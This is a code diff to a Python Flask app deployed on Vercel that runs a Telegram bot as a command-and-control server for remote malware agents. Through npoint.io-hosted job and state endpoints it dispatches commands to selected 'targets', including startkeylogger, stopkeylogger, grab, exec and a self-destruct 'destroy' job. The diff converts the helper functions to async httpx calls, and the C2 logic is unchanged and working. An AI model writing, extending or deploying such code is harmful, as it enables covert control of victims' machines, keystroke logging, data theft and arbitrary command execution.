@@ -1,12 +1,11 @@
 # api/index.py
-# Vercel-compatible controller using Flask and Webhooks.
-# FINAL VERSION with robust handling for serverless environments.
+# FINAL VERSION - Fully asynchronous with httpx
 
 import os
 import re
 import json
 import uuid
-import requests
+import httpx  # Replaced 'requests' with 'httpx'
 import asyncio
 from flask import Flask, request
 
@@ -24,37 +23,48 @@ STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
-# --- Helper Functions --- (No changes in this section)
+# --- Helper Functions (Rewritten to be async) ---
 def esc(text):
     return escape_markdown(str(text), version=2)
-def get_state():
-    try:
-        res = requests.get(STATE_URL, timeout=5)
-        res.raise_for_status()
-        return res.json().get("selected_target", None)
-    except Exception:
-        return None
-def set_state(target_id):
-    try:
-        requests.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
-    except Exception as e:
-        print(f"Error setting state: {e}")
-def post_job(target_id, command, args):
-    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
-    try:
-        try:
-            current_jobs = requests.get(JOBS_URL, timeout=5).json()
-            if not isinstance(current_jobs, list): current_jobs = []
-        except:
-            current_jobs = []
-        current_jobs.append(job)
-        requests.post(JOBS_URL, json=current_jobs, timeout=5)
-        return True
-    except Exception as e:
-        print(f"Error posting job: {e}")
-        return False
 
-# --- Telegram Command Handlers --- (No changes in this section)
+async def get_state():
+    """Reads the current selected_target asynchronously."""
+    async with httpx.AsyncClient() as client:
+        try:
+            res = await client.get(STATE_URL, timeout=5)
+            res.raise_for_status()
+            return res.json().get("selected_target", None)
+        except Exception:
+            return None
+
+async def set_state(target_id):
+    """Writes the new selected_target asynchronously."""
+    async with httpx.AsyncClient() as client:
+        try:
+            await client.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
+        except Exception as e:
+            print(f"Error setting state: {e}")
+
+async def post_job(target_id, command, args):
+    """Posts a new command job asynchronously."""
+    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
+    async with httpx.AsyncClient() as client:
+        try:
+            try:
+                res = await client.get(JOBS_URL, timeout=5)
+                current_jobs = res.json()
+                if not isinstance(current_jobs, list): current_jobs = []
+            except Exception:
+                current_jobs = []
+            
+            current_jobs.append(job)
+            await client.post(JOBS_URL, json=current_jobs, timeout=5)
+            return True
+        except Exception as e:
+            print(f"Error posting job: {e}")
+            return False
+
+# --- Telegram Command Handlers (Updated with 'await') ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "__**Vercel Controller Help**__\n\n"
@@ -76,14 +86,14 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_id = " ".join(context.args).lower() if context.args else None
     if not target_id:
-        current_target = get_state() or "None"
+        current_target = await get_state() or "None"
         await update.message.reply_text(f"Current target: `{esc(current_target)}`\nUsage: `/target <id|all|clear>`", parse_mode='MarkdownV2')
         return
     if target_id == 'clear':
-        set_state(None)
+        await set_state(None)
         await update.message.reply_text("✅ Target cleared.")
     else:
-        set_state(target_id)
+        await set_state(target_id)
         await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")
 
 async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -96,24 +106,24 @@ async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_text = (f"⚠️ **ARE YOU SURE?** ⚠️\n\nThis will permanently remove the agent from `{esc(target_id)}`\\. This action cannot be undone\\.\n\nTo proceed, type:\n`/destroy {esc(target_id)} CONFIRM`")
         await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
         return
-    if post_job(target_id, "destroy", ""):
+    if await post_job(target_id, "destroy", ""):
         await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")
 
 async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    selected_target = get_state()
+    selected_target = await get_state()
     if not selected_target:
         await update.message.reply_text("❌ No target selected\\. Use `/target` first\\.", parse_mode='MarkdownV2')
         return
     command = update.message.text.split(' ')[0][1:]
     args = " ".join(context.args)
-    if post_job(selected_target, command, args):
+    if await post_job(selected_target, command, args):
         await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
     else:
         await update.message.reply_text("❌ Error: Failed to dispatch job.")
 
-# --- Register handlers --- (No changes in this section)
+# --- Register handlers ---
 ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
@@ -121,21 +131,15 @@ agent_commands = ["info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
-# --- NEW: Robust async handler for serverless environments ---
+# --- Main Webhook Endpoint ---
 async def process_update_async(update_data):
-    """
-    Initializes the bot, processes a single update, and shuts down gracefully.
-    This is the standard pattern for running python-telegram-bot on Vercel.
-    """
     await ptb_app.initialize()
     update = Update.de_json(update_data, ptb_app.bot)
     await ptb_app.process_update(update)
     await ptb_app.shutdown()
 
-# --- Main Webhook Endpoint ---
 @app.route('/', methods=['POST'])
 def process_webhook():
-    """Receives a webhook from Telegram and processes it."""
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
     return 'OK', 200
